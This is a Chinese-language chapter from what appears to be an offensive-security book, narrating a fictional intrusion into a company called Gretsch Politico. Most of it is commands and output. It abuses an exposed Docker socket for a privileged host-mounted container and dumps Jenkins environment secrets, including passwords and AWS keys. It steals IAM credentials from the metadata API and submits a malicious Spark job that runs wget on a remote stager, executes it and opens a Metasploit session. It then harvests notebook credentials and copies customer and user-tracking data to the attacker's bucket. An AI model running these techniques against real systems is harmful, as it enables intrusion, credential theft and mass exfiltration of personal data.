# 第十二章：Apotheosis

![](img/chapterart.png)

当我们在摆弄我们的 Lambda 后门时，Gretsch Politico 的某个人好心地触发了嵌套在*ecr-login.sh*脚本中的反向 shell。不止一次，而是多次。大多数会话似乎在大约 30 分钟后超时，因此我们需要迅速且高效地评估这个新环境，并找到在其中横向渗透的新方法。我们打开其中一个 meterpreter 会话，并在远程机器上生成一个 shell：

```
meterpreter > **shell**
Channel 1 created.

# id
1 uid=0(root) gid=0(root) groups=0(root)

# hostname
2 e56951c17be0
```

我们可以看到，我们以 root 身份 1 运行在一个随机命名的机器 2 上。是的，我们很可能在一个容器内。因此，我们运行了`env`命令来揭示任何注入的机密信息，并运行了`mount`命令来显示主机共享的文件夹和文件。接下来，我们执行了几条查询元数据 API 的命令，请求该机器上附加的 IAM 角色（见列表 12-1）。

```
# env
HOSTNAME=cef681151504
GOPATH=/go
PWD=/go
GOLANG_VERSION=1.13.5
# mount
/dev/mapper/ubuntu--vg-root on /etc/hosts type ext4
(rw,relatime,errors=remount-ro,data=ordered)

1 tmpfs on /var/run/docker.sock type tmpfs
(rw,nosuid,noexec,relatime,size=404644k,mode=755)

/dev/mapper/ubuntu--vg-root on /usr/bin/docker type ext4
(rw,relatime,errors=remount-ro,data=ordered)

# apt install -y curl
# curl 169.254.169.254/latest/meta-data/iam/security-credentials/
2 ...<title>404 - Not Found</title>...
```

列表 12-1：`env`和`mount`命令的输出，后跟对元数据 API 的查询

在`env`命令的结果中，没有 Kubernetes 变量或协调器名称突出显示。看起来我们被困在一个独立的容器中，环境中没有密码或机密信息。甚至底层机器 2 上也没有附加 IAM 角色，只有一个偷偷摸摸的*/var/run/docker.sock* 1 被挂载到容器内部，还有一个 Docker 二进制文件。真是周到！

我们可以安全地将可能用于通过`curl`直接查询*/var/run/docker.sock*的丑陋 JSON 藏起来，并迅速执行 Docker 命令来枚举当前运行的容器（见列表 12-2）。

```
# docker ps
CONTAINER ID   IMAGE
1 e56951c17be0   983457354409.dkr.ecr.eu-west-1.amazonaws.com/
               app-abtest:SUP6541-add-feature-network

7f6eb2ec2565   983457354409.dkr.ecr.eu-west-1.amazonaws.com/datavalley:master

8cbc10012935   983457354409.dkr.ecr.eu-west-1.amazonaws.com/libpredict:master
`--snip--`
```

列表 12-2：主机上运行的容器列表

我们发现该机器上运行着超过 10 个容器，全部从*983457354409.dkr.ecr.eu-west-1.amazonaws.com*弹性容器注册表（ECR）中拉取。我们知道账户 ID 是 983457354409；我们在 mxrads-dl 的存储桶策略中看到它已被授权。我们的直觉是对的：最终还是 Gretsch Politico 的容器。

所有在列表 12-2 中找到的容器都使用`master`标签进行启动，除了一个：`app-abtest`镜像 1，它带有一个奇怪的标签`SUP6541-add-feature-network`。

我们或许已经对这台机器上发生的事情有了一些了解，但在得出结论之前，我们仍然需要最后一块信息。让我们使用`docker info`命令获取更多主机信息：

```
# docker info
Name: jenkins-slave-4
Total Memory: 31.859GiB
Operating System: Ubuntu 16.04.6 LTS
Server:
Containers: 546
Running: 12
`--snip--`
```

嗨，Jenkins，我们的老朋友。现在一切都明了了。我们可以推测，触发我们的负载的，可能是我们可以假设为端到端测试工作负载的某些操作。此实例中触发的任务可能会启动一个容器，使用*ecr-login.sh*脚本进行 AWS ECR 身份验证，然后提升一部分生产容器，这些容器用`master`标签标记——如`datavalley`、`libpredict`等——以及要测试的实验性 Docker 镜像：`ab-test`。这也解释了为什么它有一个与其他容器不同的标签。

以这种方式暴露 Docker 套接字在测试环境中是常见做法，在这些环境中，Docker 并不是主要用于其隔离功能，而是用于其打包功能。例如，Crane，一个流行的 Docker 编排工具([`github.com/michaelsauter/crane/`](https://github.com/michaelsauter/crane/))，用于提升容器及其依赖项。公司可能不会在每台机器上安装 Crane，而是将其打包到一个容器中，并在运行时按需拉取。

从软件的角度来看，这是很棒的。所有任务都使用相同版本的 Crane 工具，而运行测试的服务器变得无关紧要。然而，从安全的角度来看，这实际上使得使用 Docker-in-Docker 技巧成为合法（Crane 在其自己的容器内运行容器），这为地狱的洪水之门打开了。

## 持久化访问

测试任务只能持续一段时间，然后被丢弃。让我们通过在一个新的容器上运行自定义的 meterpreter，并将其标记为`aws-cli`，将这种临时访问转变为永久访问：

```
# docker run \
**--privileged \**
1 **-v /:/hostOS \**
**-v /var/run/docker.sock:/var/run/docker.sock \**
**-v /usr/bin/docker:/usr/bin/docker \**
**-d 886477354405.dkr.ecr.eu-west-1.amazonaws.com/aws-cli**
```

我们的新反向 Shell 正在一个特权容器中运行，该容器挂载了 Docker 套接字，并将整个主机文件系统挂载到*/hostOS* 1 目录中：

```
meterpreter > **ls /hostOS**
bin  boot  dev  etc  home  initrd.img  lib  lib64  lost+found  media  mnt
opt  proc  root  run...
```

让我们开始吧！

正如我们在第十章中所看到的，Jenkins 由于其调度能力，能够快速聚合大量的权限。它就像是技术世界中的雷曼兄弟——一个在无监管领域中饥渴的存在，受到鲁莽政策制定者的鼓励，且只需一次交易就能让整个经济崩溃。

在这种特殊情况下，这个隐喻中的“交易”恰好是 Jenkins 如何处理环境变量。当一个任务在一个工作节点上调度时，可以配置为仅拉取它运行所需的两三个密钥，或者加载所有可能的密钥作为环境变量。让我们来看看 Gretsch Politico 的管理员到底有多懒。

我们单独列出了在这台机器上由 Jenkins 任务启动的每一个进程：

```
shell> **ps -ed -o user,pid,cmd | grep "jenkins"**
jenkins   1012   /lib/systemd/systemd –user
jenkins   1013   sshd: jenkins@notty
Jenkins   1276   java -XX:MaxPermSize=256m -jar remoting.jar...
jenkins   30737  docker run --rm -i -p 9876:9876 -v /var/lib/...
`--snip--`
```

我们将这些进程的 PID 复制到一个文件中，并逐行遍历以获取它们的环境变量，环境变量便捷地存储在路径*/prod/$PID/environ*下：

```
shell> **ps -ed -o user,pid,cmd \**
**| grep "jenkins" \**
**| awk '{print $2}' \**
**> listpids.txt**
```

```
shell> **while read p; do \**
**cat /hostOS/proc/$p/environ >> results.txt; \**
**done <listpids.txt**
```

我们将收获上传到远程服务器，并进行一些小的格式调整，然后享受明文结果（见清单 12-3）。

```
root@Point1:~/#  **cat results.txt**
ghprbPullId = 1068
SANDBOX_PRIVATE_KEY_PATH = /var/lib/jenkins/sandbox
DBEXP_PROD_USER = pgsql_exp
DBEXP_PROD_PAS  = vDoMue8%12N97
METAMARKET_TOKEN = 1$4Xq3_rwn14gJKmkyn0Hho8p6peSZ2UGIvs...
DASHBOARD_PROD_PASSWORD = 4hXqulCghprbIU24745
SPARK_MASTER = 10.50.12.67
ActualCommitAuthorEmail = Elain.ghaber@gretschpolitico.com
BINTRAY_API_KEY = 557d459a1e9ac79a1da57$fbee88acdeacsq7S
GITHUB_API = 8e24ffcc0eeddee673ffa0ce5433ffcee7ace561
ECR_AWS_ID = AKIA76ZRK7X1QSRZ4H2P
ECR_AWS_ID = ZO5c0TQQ/5zNoEkRE99pdlnY6anhgz2s30GJ+zgb
`--snip--`
```

清单 12-3：收集在 Jenkins 机器上运行的任务环境变量的结果

太棒了。我们获得了一个 GitHub API 令牌，得以探索 GP 的整个代码库，获取了一些数据库密码来收集数据，当然还有 AWS 访问密钥，至少应该能够访问 ECR（AWS 容器注册表），如果幸运的话，甚至是 EC2。

我们把它们加载到我们的服务器上，然后盲目地开始探索 AWS 服务：

```
root@Point1:~/#  **aws ecr describe-repositories \**
**--region=eu-west-1 \**
**--profile gretsch1**

"repositoryName": "lib-prediction",
"repositoryName": "service-geoloc",
"repositoryName": "cookie-matching",
`--snip--`

root@Point1:~/#  **aws ec2 describe-instances --profile gretsch1**
An error occurred (UnauthorizedOperation)...

root@Point1:~/#  **aws s3api list-buckets --profile gretsch1**
An error occurred (UnauthorizedOperation)...

root@Point1:~/#  **aws iam get-user --profile gretsch1**
An error occurred (AccessDenied)...
```

一旦我们离开 ECR，就会遇到多个错误。在另一个时间、另一个情境下，我们会捣鼓容器镜像，寻找硬编码的凭证，或篡改生产标签以在机器上执行代码——但有一条线索似乎更有希望。它埋藏在我们在列表 12-3 中转储的环境数据里，让我再聚焦一下它：

```
SPARK_MASTER = 10.50.12.67
```

这里的`SPARK`表示 Apache Spark，这是一个开源分析引擎。单纯地让 ECR 访问密钥和数据库凭证绕过，然后专注于这个孤立的 IP 地址可能令人惊讶，但请记住我们最初的目标之一：获取用户档案和数据段。这种类型的数据不会存储在一般的 100GB 数据库中。当这些数据完全丰富，并包含关于每个人的所有可用信息时，再加上 MXR Ads 平台的规模，这些数据档案很容易达到数百甚至数千 TB。

公司在处理如此庞大的数据量时，通常会遇到两个问题。它们将原始数据存储在哪里？如何高效地处理这些数据？

存储原始数据很容易。S3 便宜且可靠，所以这没什么可争议的。然而，处理海量数据却是一个真正的挑战。数据科学家们希望以合理的成本建模并预测行为，需要一个分布式系统来处理负载——比如 500 台机器并行工作，每台机器训练多个模型，随机调整超参数，直到找到误差率最低的公式。

但这也带来了额外的问题。如何在节点之间有效地划分数据？如果所有机器都需要相同的数据该怎么办？如何聚合所有结果？最重要的是：他们如何应对故障？因为故障肯定会发生。对于每 1000 台机器，平均有 5 台，甚至更多，可能因任何原因发生故障，包括磁盘问题、过热、电力中断以及其他危险事件，即便是在顶级数据中心中也是如此。他们如何在健康节点上重新分配失败的工作负载？

正是这些问题，Apache Spark 旨在通过其分布式计算框架来解决。如果 Spark 参与了 Gretsch Politico，那么它很可能被用来处理大量数据，这些数据很可能就是我们所追求的用户档案——因此我们对在 Jenkins 机器上获取到的 IP 地址产生了兴趣。

进入 Spark 集群将自动使我们能够访问原始的性能数据，了解数据经过何种处理，并理解 Gretsch Politico 是如何利用这些数据的。

然而，到目前为止，没有一篇黑客帖子能帮助我们攻破 Spark 集群（几乎所有大数据工具也都是如此：Yarn、Flink、Hadoop、Hive 等等）。甚至没有一个 Nmap 脚本能指纹化这个该死的东西。我们正在航行在未知的水域，所以最自然的步骤是首先了解如何与 Spark 集群进行交互。

### 理解 Spark

一个 Spark 集群本质上由三个主要组件组成：主服务器、工作节点和驱动器。驱动器是执行计算的客户端；比如说，分析师的笔记本电脑就是驱动器。主节点的唯一任务是管理工作节点，并根据内存和 CPU 的需求分配任务。工作节点执行主节点分配的所有任务，并与主节点和驱动器进行通信。

这三个组件中的每一个都在 Java 虚拟机（JVM）中运行一个 Spark 进程，即使是分析师的笔记本电脑（驱动器）。不过，有个关键点：*Spark 默认禁用安全性*。

我们不仅仅在谈论认证问题，这已经很糟糕了。不，*安全性整体*被禁用了，包括加密、访问控制，当然还有认证。2021 年了，各位，整理好你们的东西吧。

根据官方文档，为了与 Spark 集群进行通信，需要满足一些网络要求。首先，我们需要能够通过 7077 端口访问主节点，以便调度任务。工作节点还需要能够发起与驱动器（我们的 Jenkins 节点）之间的连接，请求执行 JAR 文件、报告结果并处理其他调度步骤。

根据 Listing 12-3 中 `SPARK_MASTER` 环境变量的存在，我们有 90% 的把握认为 Jenkins 运行了一些 Spark 任务，因此我们可以相当确信所有这些网络条件都已正确配置。但为了确保安全起见，首先确认我们至少能够访问 Spark 主节点。测试第二个网络要求（即工作节点能否连接到驱动器）的唯一方法是提交任务或检查安全组。

我们在 Metasploit 上添加一条路由，指向 10.0.0.0/8 范围，以便到达 Spark 主节点 IP（10.50.12.67），并通过当前的 meterpreter 会话进行通道传输：

```
meterpreter > **background**

msf exploit(multi/handler) > **route add 10.0.0.0 255.0.0.0 12**
[*]  Route added
```

接着我们使用内置的 Metasploit 扫描器来探测 7077 端口：

```
msf exploit(multi/handler) > **use auxiliary/scanner/portscan/tcp**
msf exploit(scanner/portscan/tcp) > **set RHOSTS 10.50.12.67**
msf exploit(scanner/portscan/tcp) > **set PORTS 7077**
msf exploit(scanner/portscan/tcp) > **run**

[+] 192.168.1.24:         - 192.168.1.24:7077 - TCP OPEN
[*] Scanned 1 of 1 hosts (100% complete)
```

没有惊讶的事情。我们能够与主节点通信。好吧，让我们写第一个恶意 Spark 应用吧！

### 恶意 Spark

尽管 Spark 是用 Scala 编写的，但它对 Python 程序的支持非常好。将 Python 对象转换为 Java 对象需要支付高昂的序列化成本，但我们又何妨呢？我们只需要一个运行在某个工作节点上的外壳。

Python 甚至有一个 `pip` 包，它可以下载 200MB 的 JAR 文件来快速设置一个可用的 Spark 环境：

```
$ **python -m pip install pyspark**
```

每个 Spark 应用程序都以相同的模板代码开始，该代码定义了 `SparkContext`，这是一个客户端连接器，负责与 Spark 集群进行通信。我们通过这段设置代码开始我们的应用程序（参见 Listing 12-4）。

```
from pyspark import SparkContext, SparkConf

# Set up configuration options
conf = SparkConf()
conf = conf.setAppName("Word Count")

# Add the IP of the Spark master
conf = conf.setMaster("spark://10.50.12.67:7077")

# Add the IP of the Jenkins worker we are currently on
conf = conf.set("spark.driver.host", "10.33.57.66")

# Initialize the Spark context with the necessary info to reach the master
1 sc = SparkContext(conf = conf)
```

Listing 12-4：恶意 Spark 应用程序设置代码

这个 Spark 上下文 1 实现了创建和操作分布式数据的方法。它允许我们将一个普通的 Python 列表从一个整体对象转换为可以分布在多台机器上的一组单元。这些单元称为 *分区*。每个分区可以包含原始列表的一个、两个或三个元素——无论 Spark 认为最优的是什么。这里我们定义了一个包含 10 个元素的分区集合：

```
partList = sc.parallelize(range(0, 10))
```

`partList.getNumPartitions` 在我的计算机上返回 `2`，表示它已经将原始列表拆分成了两个分区。分区 1 可能包含 0、1、2、3 和 4，分区 2 可能包含 5、6、7、8 和 9。

`partList` 现在是一个分区集合。它是一个 *弹性分布式数据集*（*RDD*），支持许多迭代方法，称为 Spark 的 *转换*，例如 `map`、`flatMap`、`reduceByKey` 等，这些方法以分布式的方式转换数据。代码执行看起来与 MapReduce 操作相差甚远，但请耐心等一下：这一切都会很好地衔接起来。

在继续进行我们的 Spark 应用程序之前，我将举一个使用 `map` API 的例子，来遍历每个分区的元素，将它们传递给 `addTen` 函数，并将结果存储在一个新的 RDD 中（参见 Listing 12-5）。

```
def addTen(x):
    return x+10
plusTenList = partList.map(addOne)
```

Listing 12-5：在 Spark 上使用 `map` API

现在，`plusTenList` 包含（10，11，...）。这与常规的 Python map 或经典循环有何不同？举个例子，如果我们有两个工作节点和两个分区，Spark 会将元素 0 到 4 发送到机器 #1，将元素 5 到 9 发送到机器 #2。每台机器将迭代该列表，应用函数 `addTen`，并将部分结果返回给驱动程序（我们的 Jenkins 机器），然后驱动程序将其合并为最终输出。如果机器 #2 在计算过程中失败，Spark 会自动重新调度相同的工作负载到机器 #1。

到这时，我敢肯定你在想：“太好了，Spark 很强大，但为什么要讲这么多关于 maps 和 RDDs 的内容？我们不能直接提交 Python 代码并执行它吗？”

我希望事情能这么简单。

看，假如我们只是附加一个经典的 `subprocess.Popen` 调用并执行脚本，我们就会——嗯，你可以在 Listing 12-6 中看到结果。

```
from pyspark import SparkContext, SparkConf
from subprocess import Popen

conf = SparkConf()
conf = conf.setMaster("spark://10.50.12.67:7077")
conf = conf.set("spark.driver.host", "10.33.57.66")

sc = SparkContext(conf = conf)
partList = sc.parallelize(range(0, 10))
print(Popen(["hostname"], stdout=subprocess.PIPE).stdout.read())

$ **python test_app.py**
891451c36e6b

$ **hostname**
891451c36e6b
```

Listing 12-6：Python 代码在本地执行，而不是将其发送到 Spark 集群。

当我们运行测试应用程序时，我们得到了我们自己容器的 ID。Python 代码中的 `hostname` 命令是在我们的系统上执行的，甚至没有到达 Spark 主节点。发生了什么？

Spark 驱动程序，即在执行代码时由 PySpark 初始化的进程，技术上并不将 Python 代码发送到主节点。首先，驱动程序构建一个*有向无环图*（*DAG*），这是对在 RDD 上执行的所有操作的总结，比如加载、`map`、`flatMap`、存储为文件等（见图 12-1）。

![f12001](img/f12001.png)

图 12-1：由两个步骤组成的简单 DAG 示例：parallelize 和 map

驱动程序通过发送一些关键属性来将工作负载注册到主节点：工作负载的名称、请求的内存、初始执行器的数量等等。主节点确认注册并将 Spark 工作节点分配给传入的任务。它将这些工作节点的详细信息（IP 和端口号）共享给驱动程序，但没有进一步的动作。直到这一点为止，实际上并没有执行任何计算。数据仍然保留在驱动程序一侧。

驱动程序继续解析脚本并根据需要将步骤添加到 DAG 中，直到它遇到它认为是*动作*的部分，这是一个强制收缩 DAG 的 Spark API。这个动作可能是显示输出、保存文件、计数元素等调用（你可以在[`bit.ly/3aW64Dh`](http://bit.ly/3aW64Dh)找到 Spark 动作的列表）。只有到这一点，DAG 才会被发送到 Spark 工作节点。这些工作节点跟随 DAG 执行其中的转换和动作。

好的。我们升级了代码，添加了一个动作（在这种情况下，是 `collect` 方法），它会触发应用程序提交到工作节点（见清单 12-7）。

```
from pyspark import SparkContext, SparkConf
--`snip`--
partList = sc.parallelize(range(0, 10))
Popen(["hostname"], stdout=subprocess.PIPE).stdout.read()

for a in finalList.collect():
    print(a)
```

清单 12-7：向恶意的 Spark 应用程序添加动作

但是我们仍然缺少一个关键部分。工作节点只会遵循 DAG，而 DAG 只涉及 RDD 资源。我们需要调用 Python 的 `Popen` 来在工作节点上执行命令，但 `Popen` 既不是像 `map` 这样的 Spark 转换，也不是像 `collect` 这样的动作，因此它将被省略在 DAG 之外。我们需要作弊，并将我们的命令执行包含在 Spark 转换（例如 map）中，如清单 12-8 所示。

```
from pyspark import SparkContext, SparkConf
from subprocess import Popen

conf = SparkConf()
conf = conf.setAppName("Word Count")
conf = conf.setMaster("spark://10.50.12.67:7077")
conf = conf.set("spark.driver.host", "10.33.57.66")

sc = SparkContext(conf = conf)
partList = sc.parallelize(range(0, 1))
finalList = partList.map(
1     lambda x: Popen(["hostname"], stdout=subprocess.PIPE).stdout.read()
)
for a in finalList.collect():
    print(a)
```

清单 12-8：在 Spark 集群上执行代码的完整应用框架

与其定义一个新的命名函数并通过 `map` 迭代调用（就像我们在清单 12-5 中做的那样），我们实例化一个带有前缀 `lambda` 的匿名函数，它接受一个输入参数（每个被迭代的元素）1。当工作节点循环遍历我们的 RDD 以应用 `map` 转换时，它会遇到我们的 `lambda` 函数，该函数指示它运行 `hostname` 命令。我们来试试：

```
$ **python test_app.py**
19/12/20 18:48:46 WARN NativeCodeLoader: Unable to load native-hadoop library for your
platform... using builtin-java classes where applicable

Using Spark's default log4j profile: org/apache/spark/log4j-defaults.properties

Setting default log level to "WARN".
To adjust logging level use sc.setLogLevel(newLevel). For SparkR, use setLogLevel(newLevel).

ip-172-31-29-239
```

就这样！我们与主节点建立了联系。一个干净利落的命令执行，正如承诺的那样，在整个过程中，Spark 没有一次要求我们提供凭证。

如果我们重新启动程序，我们的任务可能会被调度到另一台工作节点。这是预期的，事实上，它正是分布式计算的核心。所有节点是相同的，具有相同的配置（IAM 角色、网络过滤器等），但它们的生命周期不一定完全相同。一台工作节点可能会接收到一个任务，该任务将数据库凭证写入磁盘，而另一台则会对错误消息进行排序。

我们可以通过构建具有*n*分区的 RDD，强制 Spark 将我们的工作负载分配到*n*台机器上：

```
partList = sc.parallelize(range(0, 10), 10)
```

然而，我们无法选择哪些节点将接收负载。是时候在一些工作节点上设置永久驻留了。

### Spark 接管

为了保持我们的恶意应用继续运行，我们希望谨慎地指示 Linux 在自己的进程组中生成它，以便忽略 JVM 在任务完成时发送的中断信号。我们还希望驱动程序等待几秒钟，直到我们的应用完成与攻击基础设施的稳定连接。我们需要在应用程序中添加以下几行：

```
`--snip--`
finalList = partList.map(
    lambda x: subprocess.Popen(
        "wget https://gretsch-spark-eu.s3.amazonaws.com/stager &&  chmod +x         ./stager && ./stager &",
        shell=True,
        preexec_fn=os.setpgrp,
    )
)
finalList.collect()
time.sleep(10)

$ **python reverse_app.py**
`--snip--`
```

在我们的攻击基础设施上，我们打开 Metasploit 并等待应用程序回拨到主机：

```
[*] https://0.0.0.0:443 handling request from...
[*] https://0.0.0.0:443 handling request from...
msf exploit(multi/handler) > **sessions -i 7**
[*] Starting interaction with 7...

meterpreter > **execute -i -f id**
Process 4638 created.
Channel 1 created.

1 uid=1000(spark) gid=1000(spark)
groups=1000(spark),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),
110(lxd),115(lpadmin),116(sambashare)...
```

太棒了！我们成功地进入了其中一台工作节点。我们以一个普通的 Spark 用户 1 身份运行，这个用户足够信任，因此被包括在了*sudo*组中。屏幕这一边没有任何抱怨。让我们通过转储环境变量、挂载的文件夹、IAM 角色，或者任何其他可能有用的内容来探索这个新的环境：

```
meterpreter > **execute -i -H -f curl -a \**
**http://169.254.169.254/latest/meta-data/iam/security-credentials**

spark-standalone.ec2

meterpreter > **execute -i -H -f curl -a \**
**http://169.254.169.254/latest/meta-data/iam/security-credentials/spark-\**
**standalone.ec2**
"AccessKeyId" : "ASIA44ZRK6WSS6D36V45",
"SecretAccessKey" : "x2XNGm+p0lF8H/U1cKqNpQG0xtLEQTHf1M9KqtxZ",
"Token" : "IQoJb3JpZ2luX2VjEJL//////////wEaCWV1LXdlc3QtM...
```

我们了解到，Spark 工作节点可以模拟 spark-standalone.ec2 角色。像大多数 IAM 角色一样，很难知道它的完整权限，但我们可以通过使用`mount`命令获得一些线索：

```
meterpreter > **execute -i -H -f mount**
`--snip--`
s3fs on /home/spark/notebooks type fuse.s3fs (rw, nosuid, nodev...)
fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)
`--snip--`
```

GP 似乎使用 s3fs 在*/home/spark/notebooks*本地挂载了一个 S3 桶。我们通过查看进程列表（使用`ps`命令并加上`-edf`参数）挖掘出了桶的名称：

```
meterpreter > **execute -i -H -f ps -a "-edf"**
`--snip--`
spark  14067 1  1 2018  00:51:15  s3fs gretsch-notebooks /home/spark/notebooks -o iam_role
`--snip--`
```

成功了。映射到*notebooks*文件夹的桶名为 gretsch-notebooks。让我们加载角色凭证并探索这个桶：

```
root@Point1:~/#  **aws s3api list-objects-v2 \**
**--bucket-name gretsch-notebooks \**
**--profile spark**

"Key": "jessie/Untitled.ipynb",
"Key": "leslie/Conversion_Model/logistic_reg_point.ipynb",
"Key": "marc/Experiment – Good logistics loss cache.ipynb",
`--snip--`
```

确实很有趣。这个桶包含扩展名为*.ipynb*的文件，这是 Python Jupyter 笔记本的标志。Jupyter 笔记本就像是一个基于 Web 的 Python 命令行界面（CLI），旨在帮助数据科学家轻松设置工作环境，具备绘制图表和共享工作的能力。这些笔记本还可以轻松与 Spark 集群连接，实现在多个机器上执行工作负载。

数据科学家需要数据来进行计算。大多数人会争辩说，他们需要生产数据来做出准确的预测。这些数据通常存储在像数据库和 S3 桶这样的地方。因此，这些曾经贫瘠的 Jupyter 笔记本迅速演变成了一个充满硬编码凭证的温暖池塘，因为科学家们需要越来越多的数据集。

让我们同步整个桶并开始寻找一些 AWS 凭证。所有的 AWS 访问密钥 ID 都以神奇的词`AKIA`开头，所以我们用`grep`来查找这个词：

```
root@Point1:~/#  **aws s3 sync s3://gretsch-notebooks ./notebooks**

root@Point1:~notebooks/# grep -R "AKIA" -4 *
yuka/Conversion_model/...  awsKeyOpt =
Some(\"AKIAASJACEDYAZYWJJM6D5\"),\n",
yuka/Conversion_model/...  awsSecretOpt =
Some(\"3ceq43SGCmTYKkiZkGrF7dr0Lssxdakymtoi14OSQ\")\n",
`--snip--`
```

哇，真是了不起！我们收集到了几十个个人 AWS 凭证，可能属于 Gretsch Politico 整个数据部门。

让我们也搜索一下在 Spark 中常用的 S3 驱动程序` s3a`和`s3n`的出现情况，揭开一些常用的 S3 存储桶，定期用于加载数据和进行实验：

```
root@Point1:~notebooks/# egrep -R "s3[a|n]://" *
1 s3a://gretsch-finance/portfolio/exports/2019/03/ report1579446047119.csv
s3a://gretsch-hadoop/engine/aft-perf/...
s3a://gretsch-hadoop-us1/nj/media/engine/clickthrough/...
s3a://gretsch-hadoop-eu1/de/social/profiles/mapping/...
`--snip--`
```

看看第一个存储桶的名称：gretsch-finance 1。这应该会很有趣。我们将使用从同一本笔记本中提取的 AWS 密钥之一，卸载位于*portfolio/exports/2020*下的密钥：

```
root@Point1:~/# aws s3 sync \
**s3://gretsch-finance/portfolio/exports/2020/ ./exports_20/ --profile data1**

root@Point1:~/# ls exports_20/
./01/report1548892800915.csv
./02/report1551319200454.csv
./03/report1551578400344.csv
./04/report1553997600119.csv
`--snip--`
```

让我们取一个随机文件来查看：

```
root@Point1:~/# head ./03/report1551578400344.csv
annual revenue, last contact, initial contact, country, account,
zip code, service purchased, ...
0.15, 20191204, 20180801, FRW nation, BR, 13010, 5...
.11, 20200103, 20170103, RPU, US, 1101, 0...
```

没错，这是一份客户列表！我们不仅获得了现有客户的信息，还有潜在客户的详细资料，包括他们最后一次接触的时间、地点、接触人、购买的最后一项服务以及他们在平台上花费了多少。

使用这些数据，Gretsch Politico 可以深入了解客户的消费习惯，也许还能揭示各种属性之间的潜在关系，例如一个会面地点和收入——谁知道呢，可能性是无穷的。如果你联系一家数据挖掘公司，你应该也做好成为实验一部分的准备。这是公平的。

那几乎是一个目标已经完成。我们可能能找到更详细的信息，但目前我们已经有了一份潜在和经过验证的客户列表。我们可以通过 Google 搜索每一行背后的政党，并为我们虚幻的民主流泪。

### 寻找原始数据

gretsch-finance 存储桶证明是一个成功的目标。让我们检查其余的存储桶：

```
root@Point1:~notebooks/# egrep -R "s3[a|n]://" *
s3a://gretsch-hadoop/engine/aft-perf/...
s3a://gretsch-hadoop-us1/nj/dmp/thirdparty/segments/...
s3a://gretsch-hadoop-eu1/de/social/profiles/mapping/...
`--snip--`
```

配置文件、社交、细分等。文件名很有吸引力。这很可能就是我们要找的用户数据。注意，gretsch-hadoop-us1 存储桶的名称暗示了区域化分区。到底有多少个区域，也就有多少个 Hadoop 存储桶？

```
root@Point1:~/# aws s3api list-buckets \
**--profile data1 \**
**--query "Buckets[].Name"\| grep Hadoop**

gretsch-hadoop-usw1
gretsch-hadoop-euw1
gretsch-hadoop-apse1
```

我们为每个三个 AWS 区域（北加州、爱尔兰和新加坡）找到了一个 Hadoop 存储桶。我们从 gretsch-hadoop-usw1 下载了 1,000 个文件，以查看它包含哪些类型的文件：

```
root@Point1:~/# aws s3api list-objects-v2 \
**--profile data1 \**
**--bucket=gretsch-hadoop-usw1 \**
**--max-items 1000**

"Key": "engine/advertiser-session/2019/06/19/15/08/user_sessions_stats.parquet",
"Key": "engine/advertiser-session/2019/06/19/15/09/user_sessions_stats.parquet",
`--snip--`
```

我们看到一些扩展名为*.parquet*的文件。*Parquet*是一种以高压缩比著称的文件格式，其压缩效果通过以列式存储数据来实现。它利用了一个准确的观察：在大多数数据库中，一列往往存储相同类型的数据（例如，整数），而一行则更可能存储不同类型的数据。与大多数数据库引擎按行分组数据不同，Parquet 按列分组数据，从而实现了超过 95%的压缩比。

我们安装了必要的工具来解压和操作*.parquet*文件，然后打开几个随机文件：

```
root@Point1:~/# python -m pip install parquet-cli
root@Point1:~/# parq 02/user_sessions_stats.parquet -head 100
userid = c9e2b1905962fa0b344301540e615b628b4b2c9f
interest_segment = 4878647678
ts = 1557900000
time_spent = 3
last_ad  = 53f407233a5f0fe92bd462af6aa649fa
last_provider = 34
ip.geo.x = 52.31.46.2
`--snip--`

root@Point1:~/# parq 03/perf_stats.parquet -head 100
click = 2
referrer = 9735842
deviceUID = 03108db-65f2-4d7c-b884-bb908d111400
`--snip--`

root@Point1:~/# parq 03/social_stats.parquet -head 100
social_segment = 61895815510
fb_profile = 3232698
insta_profile = 987615915
pinterest_profile = 57928
`--snip--`
```

我们检索了用户 ID、社交资料、兴趣细分、广告时间、地理位置和其他跟踪用户行为的令人震惊的信息。现在我们有了一些成果。数据是不稳定的，存储在专用格式中，几乎无法解读，但我们最终会搞清楚的。

我们可以在自己的机器上配置几个 TB 的存储空间，接着完全窃取这三个桶。相反，我们只是指示 AWS 将桶复制到我们自己的账户中，但首先需要稍作调整以加快速度：

```
root@Point1:~/# aws configure set default.s3.max_concurrent_requests 1000
root@Point1:~/# aws configure set default.s3.max_queue_size 100000
root@Point1:~/# aws s3 sync s3://gretsch-hadoop/ s3://my-gretsch-hadoop
```

我们拥有来自三个 Hadoop 桶的所有数据。不过，不要太激动；这些数据几乎不可能在没有大量探索、业务知识和当然的计算能力下处理。老实说，我们完全超出了自己的能力范围。

Gretsch Politico 每天都由其数据专家小队进行这种处理。我们难道不能利用他们的工作，直接窃取最终结果，而不是从头开始重新发明轮子吗？

## 偷窃处理过的数据

在 Spark 上进行数据处理和数据转化通常只是数据生命周期的第一步。一旦数据与其他输入丰富、交叉引用、格式化并扩展后，它会被存储在第二介质上。在那里，分析师（通常通过某些类似 SQL 的引擎）可以进行探索，最终数据会被输入到训练算法和预测模型中（这些算法和模型可能运行在 Spark 上，也可能不运行）。

问题是，GP 将其丰富和处理过的数据存储在哪里？最快的方式是搜索 Jupyter 笔记本，查找有关分析工具的提示、SQL 类查询、图表和仪表盘等内容（参见列表 12-9）。

```
root@Point1:~notebooks/# egrep -R -5 "sql|warehouse|snowflake|redshift|bigquery" *

redshift_endpoint = "sandbox.cdc3ssq81c3x.eu-west-1.redshift.amazonaws.com"

engine_string = "postgresql+psycopg2://%s:%s@%s:5439/datalake"\
% ("analytics-ro", "test", redshift_endpoint)

engine = create_engine(engine_string)

sql = """
select insertion_id, ctr, cpm, ads_ratio, segmentID,...;
"""
`--snip--`
```

列表 12-9：Jupyter 笔记本中使用的 SQL 查询

也许我们发现了一些值得调查的东西。Redshift 是一个经过强化的 PostgreSQL 管理数据库，以至于它已经不再适合称其为数据库。它通常被称为 *数据湖*。对于查询一个 1,000 行的小表几乎没什么用，但给它几 TB 的数据来摄取，它就能以闪电般的速度响应！它的容量可以随 AWS 的空闲服务器扩展（当然，客户也得有钱花）。

Redshift 以其显著的速度、可扩展性、并行上传能力以及与 AWS 生态系统的集成，成为该领域最有效的分析数据库之一——它可能是我们救赎的关键！

不幸的是，我们获取的凭证属于一个包含无关数据的沙箱数据库。而且，我们的 AWS 访问密钥都不能直接查询 Redshift API：

```
